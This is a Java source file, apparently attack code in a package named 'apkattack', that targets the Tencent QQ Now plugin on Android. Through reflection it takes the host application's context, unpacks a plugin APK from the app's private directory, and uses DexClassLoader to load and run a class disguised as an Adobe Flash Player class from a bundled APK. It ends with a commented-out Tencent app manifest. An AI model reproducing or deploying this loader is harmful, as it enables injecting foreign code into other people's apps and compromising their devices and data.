package com.example.apkattack;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;


//sla-cn.trustlook.com
public class QQNowAV {

	//Lcom/tencent/qqplugin/QQPlatform;
	//Lcom/tencent/manager/NowPluginManager;
	//Lcom/tencent/shadow/core/pluginmanager/BasePluginManager;
	public static void QQNowAVEntry(){
		String Tag = "QQNowAVEntry";

		Log.e(Tag,"start");
		try {
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "get context ok,package name:" + context.getPackageName()+"/class name:" + 
						context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            	//Log.e(Tag, stackElements[i].getFileName());
	            	//Log.e(Tag, stackElements[i].getLineNumber());
	            	//Log.e(Tag, stackElements[i].getMethodName());
	            }
	        }
			
	    	String dexmethodname = "start";
	    	
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";
			
			String apppath = context.getFilesDir().getParent() + "/";
	    	String unzippath = apppath + "MyQQEntry/";
	
    		File unzippathfile = new File(unzippath);
    		if (unzippathfile.exists() == false) {
    			
    			unzippathfile.mkdirs();
    			
    			Log.e(Tag,"first run,make dir");
			}
    		
			File []unzipfiles = new File(unzippath + "assets/").listFiles();
			if (unzipfiles == null || unzipfiles.length == 0) {
        		
        		//String pluginpath = apppath + "files/IVShadowCdnPmUpdater/assets/";
				String pluginpath = apppath + "files/IVShadowCdnPmUpdater/Now/";
        		String nowapkfn = "NowPluginManager.apk";
        		File [] pluginpathFiles = new File(pluginpath).listFiles();
        		for (int i = 0; i < pluginpathFiles.length; i++) {
					if (pluginpathFiles[i].isFile() && pluginpathFiles[i].getName().endsWith(".apk")) {
						nowapkfn = pluginpathFiles[i].getName();
						Log.e(Tag,"find now apk filename:" + pluginpath + nowapkfn);
						break;
					}
				}
        		

		        ZipEntry zipEntry = null;
		        byte unzipbuf[] = new byte[0x10000];
		        ZipInputStream zipIn = new ZipInputStream(new BufferedInputStream(new FileInputStream(pluginpath + nowapkfn)));

	            while ( (zipEntry = zipIn.getNextEntry()) != null) {
	            	File unzipfile = new File(unzippath + zipEntry.getName());
	                if (zipEntry.isDirectory()) {
	                	unzipfile.mkdirs();
	                	Log.e(Tag,"unzip make folder:" + zipEntry.getName());
	                } else {
	                    File unzipparent = unzipfile.getParentFile();
	                    if (unzipparent.exists() == false) {
	                    	unzipparent.mkdirs();
	                    	
	                    	Log.e(Tag,"unzip make parent folder:" + unzipparent.getName());
	                    }
	                    
	                	FileOutputStream fileOut = new FileOutputStream(unzipfile);
	                    int readedBytes = 0;
	                    while ((readedBytes = zipIn.read(unzipbuf)) > 0) {
	                        fileOut.write(unzipbuf, 0, readedBytes);
	                    }
	                    fileOut.close();
	                }
	                zipIn.closeEntry();
	            }
	            zipIn.close();
	            
	            Log.e(Tag,"unzip complete");
			}else{
				Log.e(Tag,"apk and config file already existing");
			}
			
			String apkfn = "simcard.apk";
			unzipfiles = new File(unzippath + "assets/").listFiles();
			for (int i = 0; i < unzipfiles.length; i++) {
				String tmpfn = unzipfiles[i].getName();
				if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
					apkfn = tmpfn;
					Log.e(Tag, "find apk file:" + apkfn);
					break;
				}
			}
        	
        	
        	String appcachepath = context.getCacheDir() + "/";
        	
        	DexClassLoader dexcl = new DexClassLoader(unzippath + "assets/" + apkfn, appcachepath, null,context.getClassLoader());

    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();

    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class,String.class);
    	    method.invoke(obj,context,unzippath + "assets/");
    	    
    	    Log.e(Tag, "qq now load apk success");
		} catch (Exception e) {
			 Log.e(Tag, "qq now load apk exception");
			e.printStackTrace();
		}
	}
}



/*
<?xml version="1.0" encoding="utf-8" standalone="no"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.tencent.now" platformBuildVersionCode="27" 
platformBuildVersionName="8.1.0">
    <application android:allowBackup="false" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" 
    android:name="com.tencent.now.NowAVPluginApplication" 
    android:roundIcon="@mipmap/ic_launcher_round" android:supportsRtl="true">
        <meta-data android:name="com.tencent.rdm.uuid" android:value="310adce4-d7a8-4b7c-8f82-de496a7188d8"/>
        <activity android:configChanges="orientation|screenSize" 
        android:name="com.tencent.litelive.module.videoroom.RoomActivity" 
        android:screenOrientation="portrait" android:theme="@style/now_NoWindowAnimation" 
        android:windowSoftInputMode="adjustResize">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="roomnow"/>
            </intent-filter>
        </activity>
    </application>
</manifest>
*/
